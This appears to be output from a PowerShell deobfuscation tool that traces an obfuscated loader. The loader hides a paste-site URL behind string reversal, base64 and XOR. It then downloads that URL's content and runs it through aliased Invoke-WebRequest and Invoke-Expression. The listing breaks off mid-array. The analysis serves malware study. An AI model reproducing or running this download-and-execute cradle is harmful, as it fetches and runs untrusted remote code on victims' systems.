
Id Type                   Text
-- ----                   ----
 1 Start                  Script Start
 2 End                    Script End
 3 MainStart              Main Script
 4 MainEnd                End Main Script
 5 PipelineElement        Set-Alias -name input -val Invoke-WebRequest
 6 PipelineElement        Set-Alias -name output -val Invoke-Expression
 7 AssignmentStatementAst $a = "RM0RAZ0QVMxED1BHKIFRXpgSDtAQRZFRVpgCfYVVRFVT".ToCharArray()
 8 PipelineElement        [aRRaY]::reVErse($a)
 9 AssignmentStatementAst $b = [sYstEM.CoNveRt]::froMbasE64strING($a -join"")
10 LoopStart              for ($x = 0; $x -lt $b.Count; $x++)
11 ForInit                $x = 0
12 Condition              [bool]($x -lt $b.Count)
13 LoopEnd                End For
14 ForIter                $x++
15 AssignmentStatementAst ${B}[${x}] = ${B}[${X}] -bxor 37
16 PipelineElement        Write-Host "xxx"
17 AssignmentStatementAst $c = (input ([sySteM.tExt.EncOding]::UTF8.GetString($b))).Content
18 PipelineElement        output $c


From To Label
---- -- -----
   1  3
   3  5
   5  6
   6  7
   7  8
   8  9
   9 10
  10 11
  11 12
  12 15 True
  15 14
  14 12
  12 13 False
  13 16
  16 17
  17 18
  18  4
   4  2

DOT文件已生成: C:\Users\411\Documents\experiment\new\deob\in\in.dot
流程图已生成: C:\Users\411\Documents\experiment\new\deob\in\in.png
C:\Users\411\Documents\experiment\new\deob\in\in.png

=== Defined Aliases ===
  output -> Invoke-Expression
  input -> Invoke-WebRequest

=== Resolvables ===
Node 5 (PipelineElement):
  Text: Set-Alias -name input -val Invoke-WebRequest
  - [Command] Set-Alias -name input -val Invoke-WebRequest -[0]
Node 6 (PipelineElement):
  Text: Set-Alias -name output -val Invoke-Expression
  - [Command] Set-Alias -name output -val Invoke-Expression -[0]
Node 7 (AssignmentStatementAst):
  Text: $a = "RM0RAZ0QVMxED1BHKIFRXpgSDtAQRZFRVpgCfYVVRFVT".ToCharArray()
  - [MemberInvoke Member] "RM0RAZ0QVMxED1BHKIFRXpgSDtAQRZFRVpgCfYVVRFVT".ToCharArray() -[0]
Node 8 (PipelineElement):
  Text: [aRRaY]::reVErse($a)
  - [MemberInvoke Member] [aRRaY]::reVErse($a) -[0]
Node 9 (AssignmentStatementAst):
  Text: $b = [sYstEM.CoNveRt]::froMbasE64strING($a -join"")
  - [MemberInvoke Member] [sYstEM.CoNveRt]::froMbasE64strING($a -join"") -[0]
  - [Binary] $a -join"" -[1]
Node 12 (Condition):
  Text: [bool]($x -lt $b.Count)
  - [Binary] $x -lt $b.Count -[0]
  - [Member] $b.Count -[1]
Node 14 (ForIter):
  Text: $x++
  - [Unary] $x++ -[0]
Node 15 (AssignmentStatementAst):
  Text: ${B}[${x}] = ${B}[${X}] -bxor 37
  - [Index] ${B}[${x}] -[0]
  - [Binary] ${B}[${X}] -bxor 37 -[0]
  - [Index] ${B}[${X}] -[1]
Node 16 (PipelineElement):
  Text: Write-Host "xxx"
  - [Command] Write-Host "xxx" -[0]
Node 17 (AssignmentStatementAst):
  Text: $c = (input ([sySteM.tExt.EncOding]::UTF8.GetString($b))).Content
  - [Member] (input ([sySteM.tExt.EncOding]::UTF8.GetString($b))).Content -[0]
  - [Paren] (input ([sySteM.tExt.EncOding]::UTF8.GetString($b))) -[1]
  - [Command] input ([sySteM.tExt.EncOding]::UTF8.GetString($b)) -[2]
  - [Paren] ([sySteM.tExt.EncOding]::UTF8.GetString($b)) -[3]
  - [MemberInvoke Member] [sySteM.tExt.EncOding]::UTF8.GetString($b) -[4]
  - [Member] [sySteM.tExt.EncOding]::UTF8 -[5]
Node 18 (PipelineElement):
  Text: output $c
  - [Command] output $c -[0]

=== Aliases Used ===
Node 17 (AssignmentStatementAst):
  Text: $c = (input ([sySteM.tExt.EncOding]::UTF8.GetString($b))).Content
  - input -> Invoke-WebRequest
Node 18 (PipelineElement):
  Text: output $c
  - output -> Invoke-Expression

=== CFG Traversal ===
Total visits: 114
Unique nodes: 17
Log file: C:\Users\411\Documents\experiment\new\deob\in\execution.log
DOT文件已生成: C:\Users\411\Documents\experiment\new\deob\in\in.dot
流程图已生成: C:\Users\411\Documents\experiment\new\deob\in\in.png
C:\Users\411\Documents\experiment\new\deob\in\in.png

=== Execution Results (by Node) ===

Node 7 (AssignmentStatementAst):
  Code: $a = "RM0RAZ0QVMxED1BHKIFRXpgSDtAQRZFRVpgCfYVVRFVT".ToCharArray()
    [97-157] [MemberInvoke Member] [D:0] "RM0RAZ0QVMxED1BHKIFRXpgSDtAQRZFRVpgCfYVVRFVT".ToCharArray()
      => @([char]'R', [char]'M', [char]'0', [char]'R', [char]'A', [char]'Z', [char]'0', [char]'Q', [char]'V', [char]'M', [char]'x', [char]'E', [char]'D', [char]'1', [char]'B', [char]'H', [char]'K', [char]'I', [char]'F', [char]'R', [char]'X', [char]'p', [char]'g', [char]'S', [char]'D', [char]'t', [char]'A', [char]'Q', [char]'R', [char]'Z', [char]'F', [char]'R', [char]'V', [char]'p', [char]'g', [char]'C', [char]'f', [char]'Y', [char]'V', [char]'V', [char]'R', [char]'F', [char]'V', [char]'T') (x2)

Node 8 (PipelineElement):
  Code: [aRRaY]::reVErse($a)
    [158-178] [MemberInvoke Member] [D:0] [aRRaY]::reVErse($a)
      => $null (x2)
    [175-177] [Var] $a
      => @([char]'R', [char]'M', [char]'0', [char]'R', [char]'A', [char]'Z', [char]'0', [char]'Q', [char]'V', [char]'M', [char]'x', [char]'E', [char]'D', [char]'1', [char]'B', [char]'H', [char]'K', [char]'I', [char]'F', [char]'R', [char]'X', [char]'p', [char]'g', [char]'S', [char]'D', [char]'t', [char]'A', [char]'Q', [char]'R', [char]'Z', [char]'F', [char]'R', [char]'V', [char]'p', [char]'g', [char]'C', [char]'f', [char]'Y', [char]'V', [char]'V', [char]'R', [char]'F', [char]'V', [char]'T')

Node 9 (AssignmentStatementAst):
  Code: $b = [sYstEM.CoNveRt]::froMbasE64strING($a -join"")
    [184-230] [MemberInvoke Member] [D:0] [sYstEM.CoNveRt]::froMbasE64strING($a -join"")
      => @(77, 81, 81, 85, 86, 31, 10, 10, 85, 68, 86, 81, 64, 11, 67, 74, 10, 87, 68, 82, 10, 28, 29, 67, 19, 19, 21, 67, 70, 64, 71, 67, 17) (x2)
    [219-229] [Binary] [D:1] $a -join""
      => 'TVFRVVYfCgpVRFZRQAtDSgpXRFIKHB1DExMVQ0ZAR0MR' (x2)
    [219-221] [Var] $a
      => @([char]'T', [char]'V', [char]'F', [char]'R', [char]'V', [char]'V', [char]'Y', [char]'f', [char]'C', [char]'g', [char]'p', [char]'V', [char]'R', [char]'F', [char]'Z', [char]'R', [char]'Q', [char]'A', [char]'t', [char]'D', [char]'S', [char]'g', [char]'p', [char]'X', [char]'R', [char]'F', [char]'I', [char]'K', [char]'H', [char]'B', [char]'1', [char]'D', [char]'E', [char]'x', [char]'M', [char]'V', [char]'Q', [char]'0', [char]'Z', [char]'A', [char]'R', [char]'0', [char]'M', [char]'R')

Node 12 (Condition):
  Code: [bool]($x -lt $b.Count)
    [245-260] [Binary] [D:0] $x -lt $b.Count
      => INCONSISTENT: $True, $True, $True, $True, $True, $True, $True, $True, $True, $True, $True, $True, $True, $True, $True, $True, $True, $True, $True, $True, $True, $True, $True, $True, $True, $True, $True, $True, $True, $True, $True, $True, $True, $True, $True, $True, $True, $True, $True, $True, $True, $True, $True, $True, $True, $True, $True, $True, $True, $True, $True, $True, $True, $True, $True, $True, $True, $True, $True, $True, $True, $True, $True, $True, $True, $True, $False, $False
    [245-247] [Var] $x
      => INCONSISTENT: 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33
    [252-260] [Member] [D:1] $b.Count
      => 33 (x68)
    [252-254] [Var] $b
      => INCONSISTENT: @(77, 81, 81, 85, 86, 31, 10, 10, 85, 68, 86, 81, 64, 11, 67, 74, 10, 87, 68, 82, 10, 28, 29, 67, 19, 19, 21, 67, 70, 64, 71, 67, 17), @(104, 81, 81, 85, 86, 31, 10, 10, 85, 68, 86, 81, 64, 11, 67, 74, 10, 87, 68, 82, 10, 28, 29, 67, 19, 19, 21, 67, 70, 64, 71, 67, 17), @(104, 116, 81, 85, 86, 31, 10, 10, 85, 68, 86, 81, 64, 11, 67, 74, 10, 87, 68, 82, 10, 28, 29, 67, 19, 19, 21, 67, 70, 64, 71, 67, 17), @(104, 116, 116, 85, 86, 31, 10, 10, 85, 68, 86, 81, 64, 11, 67, 74, 10, 87, 68, 82, 10, 28, 29, 67, 19, 19, 21, 67, 70, 64, 71, 67, 17), @(104, 116, 116, 112, 86, 31, 10, 10, 85, 68, 86, 81, 64, 11, 67, 74, 10, 87, 68, 82, 10, 28, 29, 67, 19, 19, 21, 67, 70, 64, 71, 67, 17), @(104, 116, 116, 112, 115, 31, 10, 10, 85, 68, 86, 81, 64, 11, 67, 74, 10, 87, 68, 82, 10, 28, 29, 67, 19, 19, 21, 67, 70, 64, 71, 67, 17), @(104, 116, 116, 112, 115, 58, 10, 10, 85, 68, 86, 81, 64, 11, 67, 74, 10, 87, 68, 82, 10, 28, 29, 67, 19, 19, 21, 67, 70, 64, 71, 67, 17), @(104, 116, 116, 112, 115, 58, 47, 10, 85, 68, 86, 81, 64, 11, 67, 74, 10, 87, 68, 82, 10, 28, 29, 67, 19, 19, 21, 67, 70, 64, 71, 67, 17), @(104, 116, 116, 112, 115, 58, 47, 47, 85, 68, 86, 81, 64, 11, 67, 74, 10, 87, 68, 82, 10, 28, 29, 67, 19, 19, 21, 67, 70, 64, 71, 67, 17), @(104, 116, 116, 112, 115, 58, 47, 47, 112, 68, 86, 81, 64, 11, 67, 74, 10, 87, 68, 82, 10, 28, 29, 67, 19, 19, 21, 67, 70, 64, 71, 67, 17), @(104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 86, 81, 64, 11, 67, 74, 10, 87, 68, 82, 10, 28, 29, 67, 19, 19, 21, 67, 70, 64, 71, 67, 17), @(104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 81, 64, 11, 67, 74, 10, 87, 68, 82, 10, 28, 29, 67, 19, 19, 21, 67, 70, 64, 71, 67, 17), @(104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 64, 11, 67, 74, 10, 87, 68, 82, 10, 28, 29, 67, 19, 19, 21, 67, 70, 64, 71, 67, 17), @(104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 11, 67, 74, 10, 87, 68, 82, 10, 28, 29, 67, 19, 19, 21, 67, 70, 64, 71, 67, 17), @(104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 46, 67, 74, 10, 87, 68, 82, 10, 28, 29, 67, 19, 19, 21, 67, 70, 64, 71, 67, 17), @(104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 46, 102, 74, 10, 87, 68, 82, 10, 28, 29, 67, 19, 19, 21, 67, 70, 64, 71, 67, 17), @(104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 46, 102, 111, 10, 87, 68, 82, 10, 28, 29, 67, 19, 19, 21, 67, 70, 64, 71, 67, 17), @(104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 46, 102, 111, 47, 87, 68, 82, 10, 28, 29, 67, 19, 19, 21, 67, 70, 64, 71, 67, 17), @(104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 46, 102, 111, 47, 114, 68, 82, 10, 28, 29, 67, 19, 19, 21, 67, 70, 64, 71, 67, 17), @(104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 46, 102, 111, 47, 114, 97, 82, 10, 28, 29, 67, 19, 19, 21, 67, 70, 64, 71, 67, 17), @(104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 46, 102, 111, 47, 114, 97, 119, 10, 28, 29, 67, 19, 19, 21, 67, 70, 64, 71, 67, 17), @(104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 46, 102, 111, 47, 114, 97, 119, 47, 28, 29, 67, 19, 19, 21, 67, 70, 64, 71, 67, 17), @(104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 46, 102, 111, 47, 114, 97, 119, 47, 57, 29, 67, 19, 19, 21, 67, 70, 64, 71, 67, 17), @(104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 46, 102, 111, 47, 114, 97, 119, 47, 57, 56, 67, 19, 19, 21, 67, 70, 64, 71, 67, 17), @(104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 46, 102, 111, 47, 114, 97, 119, 47, 57, 56, 102, 19, 19, 21, 67, 70, 64, 71, 67, 17), @(104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 46, 102, 111, 47, 114, 97, 119, 47, 57, 56, 102, 54, 19, 21, 67, 70, 64, 71, 67, 17), @(104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 46, 102, 111, 47, 114, 97, 119, 47, 57, 56, 102, 54, 54, 21, 67, 70, 64, 71, 67, 17), @(104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 46, 102, 111, 47, 114, 97, 119, 47, 57, 56, 102, 54, 54, 48, 67, 70, 64, 71, 67, 17), @(104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 46, 102, 111, 47, 114, 97, 119, 47, 57, 56, 102, 54, 54, 48, 102, 70, 64, 71, 67, 17), @(104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 46, 102, 111, 47, 114, 97, 119, 47, 57, 56, 102, 54, 54, 48, 102, 99, 64, 71, 67, 17), @(104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 46, 102, 111, 47, 114, 97, 119, 47, 57, 56, 102, 54, 54, 48, 102, 99, 101, 71, 67, 17), @(104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 46, 102, 111, 47, 114, 97, 119, 47, 57, 56, 102, 54, 54, 48, 102, 99, 101, 98, 67, 17), @(104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 46, 102, 111, 47, 114, 97, 119, 47, 57, 56, 102, 54, 54, 48, 102, 99, 101, 98, 102, 17), @(104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 46, 102, 111, 47, 114, 97, 119, 47, 57, 56, 102, 54, 54, 48, 102, 99, 101, 98, 102, 52)

Node 14 (ForIter):
  Code: $x++
    [262-264] [Var] $x
      => INCONSISTENT: 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32

Node 15 (AssignmentStatementAst):
  Code: ${B}[${x}] = ${B}[${X}] -bxor 37
    [274-284] [Index] [D:0] ${B}[${x}]
      => INCONSISTENT: 77, 104, 81, 116, 81, 116, 85, 112, 86, 115, 31, 58, 10, 47, 10, 47, 85, 112, 68, 97, 86, 115, 81, 116, 64, 101, 11, 46, 67, 102, 74, 111, 10, 47, 87, 114, 68, 97, 82, 119, 10, 47, 28, 57, 29, 56, 67, 102, 19, 54, 19, 54, 21, 48, 67, 102, 70, 99, 64, 101, 71, 98, 67, 102, 17, 52
    [274-278] [Var] ${B}
      => INCONSISTENT: @(77, 81, 81, 85, 86, 31, 10, 10, 85, 68, 86, 81, 64, 11, 67, 74, 10, 87, 68, 82, 10, 28, 29, 67, 19, 19, 21, 67, 70, 64, 71, 67, 17), @(104, 81, 81, 85, 86, 31, 10, 10, 85, 68, 86, 81, 64, 11, 67, 74, 10, 87, 68, 82, 10, 28, 29, 67, 19, 19, 21, 67, 70, 64, 71, 67, 17), @(104, 116, 81, 85, 86, 31, 10, 10, 85, 68, 86, 81, 64, 11, 67, 74, 10, 87, 68, 82, 10, 28, 29, 67, 19, 19, 21, 67, 70, 64, 71, 67, 17), @(104, 116, 116, 85, 86, 31, 10, 10, 85, 68, 86, 81, 64, 11, 67, 74, 10, 87, 68, 82, 10, 28, 29, 67, 19, 19, 21, 67, 70, 64, 71, 67, 17), @(104, 116, 116, 112, 86, 31, 10, 10, 85, 68, 86, 81, 64, 11, 67, 74, 10, 87, 68, 82, 10, 28, 29, 67, 19, 19, 21, 67, 70, 64, 71, 67, 17), @(104, 116, 116, 112, 115, 31, 10, 10, 85, 68, 86, 81, 64, 11, 67, 74, 10, 87, 68, 82, 10, 28, 29, 67, 19, 19, 21, 67, 70, 64, 71, 67, 17), @(104, 116, 116, 112, 115, 58, 10, 10, 85, 68, 86, 81, 64, 11, 67, 74, 10, 87, 68, 82, 10, 28, 29, 67, 19, 19, 21, 67, 70, 64, 71, 67, 17), @(104, 116, 116, 112, 115, 58, 47, 10, 85, 68, 86, 81, 64, 11, 67, 74, 10, 87, 68, 82, 10, 28, 29, 67, 19, 19, 21, 67, 70, 64, 71, 67, 17), @(104, 116, 116, 112, 115, 58, 47, 47, 85, 68, 86, 81, 64, 11, 67, 74, 10, 87, 68, 82, 10, 28, 29, 67, 19, 19, 21, 67, 70, 64, 71, 67, 17), @(104, 116, 116, 112, 115, 58, 47, 47, 112, 68, 86, 81, 64, 11, 67, 74, 10, 87, 68, 82, 10, 28, 29, 67, 19, 19, 21, 67, 70, 64, 71, 67, 17), @(104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 86, 81, 64, 11, 67, 74, 10, 87, 68, 82, 10, 28, 29, 67, 19, 19, 21, 67, 70, 64, 71, 67, 17), @(104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 81, 64, 11, 67, 74, 10, 87, 68, 82, 10, 28, 29, 67, 19, 19, 21, 67, 70, 64, 71, 67, 17), @(104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 64, 11, 67, 74, 10, 87, 68, 82, 10, 28, 29, 67, 19, 19, 21, 67, 70, 64, 71, 67, 17), @(104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 11, 67, 74, 10, 87, 68, 82, 10, 28, 29, 67, 19, 19, 21, 67, 70, 64, 71, 67, 17), @(104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 46, 67, 74, 10, 87, 68, 82, 10, 28, 29, 67, 19, 19, 21, 67, 70, 64, 71, 67, 17), @(104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 46, 102, 74, 10, 87, 68, 82, 10, 28, 29, 67, 19, 19, 21, 67, 70, 64, 71, 67, 17), @(104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 46, 102, 111, 10, 87, 68, 82, 10, 28, 29, 67, 19, 19, 21, 67, 70, 64, 71, 67, 17), @(104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 46, 102, 111, 47, 87, 68, 82, 10, 28, 29, 67, 19, 19, 21, 67, 70, 64, 71, 67, 17), @(104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 46, 102, 111, 47, 114, 68, 82, 10, 28, 29, 67, 19, 19, 21, 67, 70, 64, 71, 67, 17), @(104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 46, 102, 111, 47, 114, 97, 82, 10, 28, 29, 67, 19, 19, 21, 67, 70, 64, 71, 67, 17), @(104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 46, 102, 111, 47, 114, 97, 119, 10, 28, 29, 67, 19, 19, 21, 67, 70, 64, 71, 67, 17), @(104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 46, 102, 111, 47, 114, 97, 119, 47, 28, 29, 67, 19, 19, 21, 67, 70, 64, 71, 67, 17), @(104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 46, 102, 111, 47, 114, 97, 119, 47, 57, 29, 67, 19, 19, 21, 67, 70, 64, 71, 67, 17), @(104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 46, 102, 111, 47, 114, 97, 119, 47, 57, 56, 67, 19, 19, 21, 67, 70, 64, 71, 67, 17), @(104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 46, 102, 111, 47, 114, 97, 119, 47, 57, 56, 102, 19, 19, 21, 67, 70, 64, 71, 67, 17), @(104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 46, 102, 111, 47, 114, 97, 119, 47, 57, 56, 102, 54, 19, 21, 67, 70, 64, 71, 67, 17), @(104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 46, 102, 111, 47, 114, 97, 119, 47, 57, 56, 102, 54, 54, 21, 67, 70, 64, 71, 67, 17), @(104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 46, 102, 111, 47, 114, 97, 119, 47, 57, 56, 102, 54, 54, 48, 67, 70, 64, 71, 67, 17), @(104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 46, 102, 111, 47, 114, 97, 119, 47, 57, 56, 102, 54, 54, 48, 102, 70, 64, 71, 67, 17), @(104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 46, 102, 111, 47, 114, 97, 119, 47, 57, 56, 102, 54, 54, 48, 102, 99, 64, 71, 67, 17), @(104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 46, 102, 111, 47, 114, 97, 119, 47, 57, 56, 102, 54, 54, 48, 102, 99, 101, 71, 67, 17), @(104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 46, 102, 111, 47, 114, 97, 119, 47, 57, 56, 102, 54, 54, 48, 102, 99, 101, 98, 67, 17), @(104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 46, 102, 111, 47, 114, 97, 119, 47, 57, 56, 102, 54, 54, 48, 102, 99, 101, 98, 102, 17)
    [279-283] [Var] ${x}
      => INCONSISTENT: 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32
    [287-306] [Binary] [D:0] ${B}[${X}] -bxor 37
      => INCONSISTENT: 104, 77, 116, 81, 116, 81, 112, 85, 115, 86, 58, 31, 47, 10, 47, 10, 112, 85, 97, 68, 115, 86, 116, 81, 101, 64, 46, 11, 102, 67, 111, 74, 47, 10, 114, 87, 97, 68, 119, 82, 47, 10, 57, 28, 56, 29, 102, 67, 54, 19, 54, 19, 48, 21, 102, 67, 99, 70, 101, 64, 98, 71, 102, 67, 52, 17
    [287-297] [Index] [D:1] ${B}[${X}]
      => INCONSISTENT: 77, 104, 81, 116, 81, 116, 85, 112, 86, 115, 31, 58, 10, 47, 10, 47, 85, 112, 68, 97, 86, 115, 81, 116, 64, 101, 11, 46, 67, 102, 74, 111, 10, 47, 87, 114, 68, 97, 82, 119, 10, 47, 28, 57, 29, 56, 67, 102, 19, 54, 19, 54, 21, 48, 67, 102, 70, 99, 64, 101, 71, 98, 67, 102, 17, 52
    [287-291] [Var] ${B}
      => INCONSISTENT: @(77, 81, 81, 85, 86, 31, 10, 10, 85, 68, 86, 81, 64, 11, 67, 74, 10, 87, 68, 82, 10, 28, 29, 67, 19, 19, 21, 67, 70, 64, 71, 67, 17), @(104, 81, 81, 85, 86, 31, 10, 10, 85, 68, 86, 81, 64, 11, 67, 74, 10, 87, 68, 82, 10, 28, 29, 67, 19, 19, 21, 67, 70, 64, 71, 67, 17), @(104, 116, 81, 85, 86, 31, 10, 10, 85, 68, 86, 81, 64, 11, 67, 74, 10, 87, 68, 82, 10, 28, 29, 67, 19, 19, 21, 67, 70, 64, 71, 67, 17), @(104, 116, 116, 85, 86, 31, 10, 10, 85, 68, 86, 81, 64, 11, 67, 74, 10, 87, 68, 82, 10, 28, 29, 67, 19, 19, 21, 67, 70, 64, 71, 67, 17), @(104, 116, 116, 112, 86, 31, 10, 10, 85, 68, 86, 81, 64, 11, 67, 74, 10, 87, 68, 82, 10, 28, 29, 67, 19, 19, 21, 67, 70, 64, 71, 67, 17), @(104, 116, 116, 112, 115, 31, 10, 10, 85, 68, 86, 81, 64, 11, 67, 74, 10, 87, 68, 82, 10, 28, 29, 67, 19, 19, 21, 67, 70, 64, 71, 67, 17), @(104, 116, 116, 112, 115, 58, 10, 10, 85, 68, 86, 81, 64, 11, 67, 74, 10, 87, 68, 82, 10, 28, 29, 67, 19, 19, 21, 67, 70, 64, 71, 67, 17), @(104, 116, 116, 112, 115, 58, 47, 10, 85, 68, 86, 81, 64, 11, 67, 74, 10, 87, 68, 82, 10, 28, 29, 67, 19, 19, 21, 67, 70, 64, 71, 67, 17), @(104, 116, 116, 112, 115, 58, 47, 47, 85, 68, 86, 81, 64, 11, 67, 74, 10, 87, 68, 82, 10, 28, 29, 67, 19, 19, 21, 67, 70, 64, 71, 67, 17), @(104, 116, 116, 112, 115, 58, 47, 47, 112, 68, 86, 81, 64, 11, 67, 74, 10, 87, 68, 82, 10, 28, 29, 67, 19, 19, 21, 67, 70, 64, 71, 67, 17), @(104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 86, 81, 64, 11, 67, 74, 10, 87, 68, 82, 10, 28, 29, 67, 19, 19, 21, 67, 70, 64, 71, 67, 17), @(104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 81, 64, 11, 67, 74, 10, 87, 68, 82, 10, 28, 29, 67, 19, 19, 21, 67, 70, 64, 71, 67, 17), @(104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 64, 11, 67, 74, 10, 87, 68, 82, 10, 28, 29, 67, 19, 19, 21, 67, 70, 64, 71, 67, 17), @(104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 11, 67, 74, 10, 87, 68, 82, 10, 28, 29, 67, 19, 19, 21, 67, 70, 64, 71, 67, 17), @(104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 46, 67, 74, 10, 87, 68, 82, 10, 28, 29, 67, 19, 19, 21, 67, 70, 64, 71, 67, 17), @(104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 46, 102, 74, 10, 87, 68, 82, 10, 28, 29, 67, 19, 19, 21, 67, 70, 64, 71, 67, 17), @(104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 46, 102, 111, 10, 87, 68, 82, 10, 28, 29, 67, 19, 19, 21, 67, 70, 64, 71, 67, 17), @(104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 46, 102, 111, 47, 87, 68, 82, 10, 28, 29, 67, 19, 19, 21, 67, 70, 64, 71, 67, 17), @(104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 46, 102, 111, 47, 114, 68, 82, 10, 28, 29, 67, 19, 19, 21, 67, 70, 64, 71, 67, 17), @(104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 46, 102, 111, 47, 114, 97, 82, 10, 28, 29, 67, 19, 19, 21, 67, 70, 64, 71, 67, 17), @(104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 46, 102, 111, 47, 114, 97, 119, 10, 28, 29, 67, 19, 19, 21, 67, 70, 64, 71, 67, 17), @(104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 46, 102, 111, 47, 114, 97, 119, 47, 28, 29, 67, 19, 19, 21, 67, 70, 64, 71, 67, 17), @(104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 46, 102, 111, 47, 114, 97, 119, 47, 57, 29, 67, 19, 19, 21, 67, 70, 64, 71, 67, 17), @(104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 46, 102, 111, 47, 114, 97, 119, 47, 57, 56, 67, 19, 19, 21, 67, 70, 64, 71, 67, 17), @(104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 46, 102, 111, 47, 114, 97, 119, 47, 57, 56, 102, 19, 19, 21, 67, 70, 64, 71, 67, 17), @(104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 46, 102, 111, 47, 114, 97, 119, 47, 57, 56, 102, 54, 19, 21, 67, 70, 64, 71, 67, 17), @(104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 46, 102, 111, 47, 114, 97, 119, 47, 57, 56, 102, 54, 54, 21, 67, 70, 64, 71, 67, 17), @(104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 46, 102, 111, 47, 114, 97, 119, 47, 57, 56, 102, 54, 54, 48, 67, 70, 64, 71, 67, 17), @(104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 46, 102, 111, 47, 114, 97, 119, 47, 57, 56, 102, 54, 54, 48, 102, 70, 64, 71, 67, 17), @(104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 46, 102, 111, 47, 114, 97, 119, 47, 57, 56, 102, 54, 54, 48, 102, 99, 64, 71, 67, 17), @(104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 46, 102, 111, 47, 114, 97, 119, 47, 57, 56, 102, 54, 54, 48, 102, 99, 101, 71, 67, 17), @(104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 46, 102, 111, 47, 114, 97, 119, 47, 57, 56, 102, 54, 54, 48, 102, 99, 101, 98, 67, 17), @(104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 46, 102, 111, 47, 114, 97, 119, 47, 57, 